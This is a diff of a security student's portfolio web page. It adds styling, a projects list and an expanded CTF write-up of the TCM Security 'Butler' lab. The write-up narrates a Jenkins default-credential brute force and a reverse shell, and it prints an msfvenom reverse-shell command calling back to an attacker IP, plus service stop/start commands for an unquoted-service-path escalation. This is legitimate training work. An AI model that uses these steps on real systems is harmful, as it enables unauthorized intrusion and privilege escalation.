@@ -54,6 +54,7 @@
         }
         section.active {
             display: block;
+            animation: fadeIn 0.5s ease-in;
         }
         .subsection {
             margin-top: 20px;
@@ -66,29 +67,88 @@
         .subsection-content {
             display: none;
             margin-top: 10px;
-        }
-        img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 10px auto;
-            border-radius: 5px;
-        }
-        pre {
-            text-align: left;
-            background-color: #222;
-            padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
-        }
-        code {
-            color: #00ffff;
+            transition: all 0.3s ease;
         }
         footer {
             margin-top: 50px;
             padding: 10px;
             font-size: 14px;
             background-color: #111;
+        }
+        
+        /* New CSS additions */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            border: 1px solid #00ffff;
+            margin: 10px 0;
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.3);
+        }
+
+        pre {
+            background-color: #111;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border-left: 3px solid #00ffff;
+        }
+
+        code {
+            color: #00ffff;
+            font-family: 'Source Code Pro', monospace;
+        }
+
+        .ctf-content h2, .ctf-content h3 {
+            color: #00ffff;
+            margin-top: 25px;
+        }
+
+        .ctf-content ul, .ctf-content ol {
+            text-align: left;
+            margin-left: 20px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .project-link {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 8px 15px;
+            background-color: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 5px;
+            color: #00ffff;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .project-link:hover {
+            background-color: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
+        }
+        
+        ul, ol {
+            text-align: left;
+            padding-left: 20px;
+        }
+        
+        ul li, ol li {
+            margin: 5px 0;
+        }
+        
+        ul li a {
+            color: #00ffff;
+            text-decoration: none;
+            transition: color 0.3s, text-shadow 0.3s;
+        }
+        
+        ul li a:hover {
+            color: #ffffff;
+            text-shadow: 0 0 8px #00ffff;
         }
     </style>
     <script>
@@ -122,47 +182,100 @@
     <div class="container">
         <section id="about" class="active">
             <h2>About Me</h2>
-            <p>Hi, my name is Johnny Tavares and welcome to my site! I'm a passionate Information Technology enthusiast and computer science major, currently pursuing my Security+ certification. I'm working on building impactful projects in Python to showcase my security expertise, while also honing my skills through things like CTF challenges, research, etc.</p>
+            <p>Hi, my name is Johnny Tavares and welcome to my site! I'm a passionate Information Technology enthusiast and computer science major, currently pursuing my Security+ certification. I'm working on building impactful projects in Python to showcase my security expertise, while also honing my skills through things like CTF challenges, research, etc. As a bonus, I like exploring game development using Unity and C# to express my creativity.</p>
             <ul>
                 <li><a href="https://www.github.com/johnny-tavares">Github</a></li>
-                <li><a href="https://www.linkedin.com/in/johnny-tavares">Linkedin</a></li>
+                <li><a href="https://www.linkedin.com/in/johnny-tavares">LinkedIn</a></li>
             </ul>
+        </section>
+        <section id="projects">
+            <h2>Projects</h2>
+            <div class="subsection" onclick="toggleSubsection('project1')">Threat Dashboard</div>
+            <div id="project1" class="subsection-content">
+                <p>A comprehensive security dashboard for monitoring and analyzing potential threats.</p>
+                <a href="https://www.github.com/johnny-tavares/Threat_Dashboard" class="project-link">
+                    Find on Github
+                </a>
+                <div>
+                    <img src="images/Dashboard.png" alt="Threat Dashboard Screenshot">
+                </div>
+            </div>
+            <div class="subsection" onclick="toggleSubsection('project2')">Home SIEM Lab</div>
+            <div id="project2" class="subsection-content">
+                <p>A personal Security Information and Event Management lab for practicing threat detection and analysis.</p>
+                <a href="#" class="project-link">
+                    Coming soon
+                </a>
+            </div>
         </section>
         <section id="ctf">
             <h2>CTF Write-ups</h2>
             <div class="subsection" onclick="toggleSubsection('ctf1')">Butler (TCM Security)</div>
-            <div id="ctf1" class="subsection-content">
+            <div id="ctf1" class="subsection-content ctf-content">
                 <h2>Initial Enumeration</h2>
-                <p>Running an <strong>nmap scan</strong> revealed <strong>port 8080</strong> running <strong>Jenkins</strong>. A brute-force attack using <strong>Burp Suite</strong> found the credentials:</p>
+                <p>The first step was running an <strong>nmap scan</strong> to check open ports on the machine. The scan revealed <strong>port 8080</strong> running <strong>HTTP</strong>, which was hosting a <strong>Jenkins</strong> service. With Jenkins running, I decided to attempt a <strong>brute force attack</strong> on the login page using <strong>Burp Suite</strong>.</p>
+
+                <h3>Brute Forcing with Burp Suite</h3>
+                <p>Using a <strong>Cluster Bomb attack</strong> in Burp Suite, I tried a few common usernames and passwords. After some testing, the valid credentials turned out to be:</p>
                 <ul>
                     <li><strong>Username:</strong> jenkins</li>
                     <li><strong>Password:</strong> jenkins</li>
                 </ul>
+                <p>This login worked, as evidenced by a change in the length of the response after submitting the credentials.</p>
 
                 <h2>Exploitation</h2>
-                <p>Once logged in, I used a known <strong>Jenkins exploit</strong> to get a <strong>reverse shell</strong>, gaining access as the user <strong>butler</strong>.</p>
+                <p>Once logged into Jenkins, I searched for known <strong>Jenkins exploits</strong>. It seems there is a vulnerability that allows us to gain a <strong>reverse shell</strong> through the Jenkins <strong>console</strong> in the settings. This vulnerability gave me system access, and I was now logged in as the user <strong>butler</strong>.</p>
 
                 <h2>Privilege Escalation</h2>
-                <h3>Step 1: Running WinPEAS</h3>
-                <pre><code>python -m http.server 80</code></pre>
-                <p>Transferred WinPEAS using:</p>
-                <pre><code>certutil.exe -urlcache -f http://192.168.x.x/winpeas.exe winpeas.exe</code></pre>
 
-                <h3>Step 2: Exploiting Unquoted Service Path</h3>
-                <p>Identified a vulnerable <strong>WiseCare</strong> service with an <strong>unquoted service path</strong>:</p>
-                <img src="Images/Butler_WiseCare.png" alt="WiseCare Vulnerability">
+                <h3>Step 1: Downloading and Hosting WinPEAS</h3>
+                <p>First, I downloaded <strong>winpeas</strong>, a tool designed for privilege escalation enumeration on Windows. Since it was a Windows machine, I used the <strong>Windows version of linpeas</strong> called <strong>winpeas</strong>.</p>
+                <p>To make <strong>winpeas</strong> available to the machine, I:</p>
+                <ol>
+                    <li>Hosted a <strong>Python HTTP server</strong> to serve the script:</li>
+                    <pre><code>python -m http.server 80</code></pre>
+                    <li>Changed the directory to <code>C:/users/butler</code>, as it would allow me to run the <strong>winpeas</strong> script.</li>
+                </ol>
 
-                <h3>Step 3: Creating a Malicious Executable</h3>
-                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.206.128 LPORT=7777 -f exe > Wise.exe</code></pre>
+                <h3>Step 2: Transfer winpeas using Certutil.exe</h3>
+                <p>I used <strong>certutil.exe</strong> to fetch the <strong>winpeas</strong> script from the Python HTTP server I had set up.</p>
 
-                <h3>Step 4: Exploiting the Service</h3>
+                <h3>Step 3: Unquoted Service Path Attack</h3>
+                <p>Next, I discovered that the <strong>WiseCare</strong> service had an <strong>unquoted service path</strong> vulnerability, which is a common privilege escalation vector in Windows environments.</p>
+                <img src="images/Buter_WiseCare.png" alt="WiseCare Vulnerability Screenshot">
+
+                <h3>Step 4: Generating Malicious Payload with msfvenom</h3>
+                <p>To take advantage of this, I used <strong>msfvenom</strong> to generate a <strong>reverse shell payload</strong>. The payload I generated was designed to execute a shell on my machine with <strong>SYSTEM</strong> privileges when the vulnerable service starts:</p>
+                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.206.128 LPORT=7777 -f exe &gt; Wise.exe</code></pre>
+
+                <h3>Step 5: Transferring the Payload</h3>
+                <p>I then transferred the <strong>Wise.exe</strong> payload to the <strong>WiseCare</strong> folder located in <code>Program Files (x86)</code>. To do this, I hosted the <strong>Wise.exe</strong> file again using the Python HTTP server, and then used <strong>certutil.exe</strong> to download the payload.</p>
+
+                <h3>Step 6: Stopping and Restarting the Vulnerable Service</h3>
+                <p>I stopped the <strong>WiseBootAssistant</strong> service using the following command:</p>
                 <pre><code>sc stop WiseBootAssistant</code></pre>
+                <p>Then, I restarted the service with:</p>
                 <pre><code>sc start WiseBootAssistant</code></pre>
-                <p>On restart, my <strong>Wise.exe</strong> payload was executed, granting a SYSTEM shell.</p>
+                <p>When the service started, it executed the <strong>Wise.exe</strong> payload, which resulted in a <strong>SYSTEM shell</strong> being returned to me.</p>
 
                 <h2>Conclusion</h2>
-                <p>By combining a **Jenkins brute-force attack**, **reverse shell exploit**, and an **unquoted service path attack**, I gained SYSTEM access to the **Butler** machine.</p>
+                <p>At this point, I had successfully escalated my privileges to <strong>SYSTEM</strong> and had full control of the machine. The combination of a <strong>Jenkins brute force attack</strong>, <strong>reverse shell through Jenkins</strong>, and exploiting the <strong>unquoted service path vulnerability</strong> in <strong>WiseCare</strong> allowed me to gain full access and escalate privileges on the <strong>Butler</strong> machine.</p>
             </div>
+            <div class="subsection" onclick="toggleSubsection('ctf2')">Coming soon!</div>
+            <div id="ctf2" class="subsection-content ctf-content">
+                <p>More CTF write-ups will be added as I complete them. Stay tuned!</p>
+            </div>
+        </section>
+        <section id="research">
+            <h2>Research</h2>
+            <div class="subsection" onclick="toggleSubsection('research1')">Coming soon!</div>
+            <div id="research1" class="subsection-content">
+                <p>Research papers and findings will be published here. Check back later!</p>
+            </div>
+        </section>
+        <section id="blog">
+            <h2>Blog</h2>
+            <p>Blog posts about cybersecurity topics, tutorials, and insights coming soon!</p>
         </section>
     </div>
     <footer>
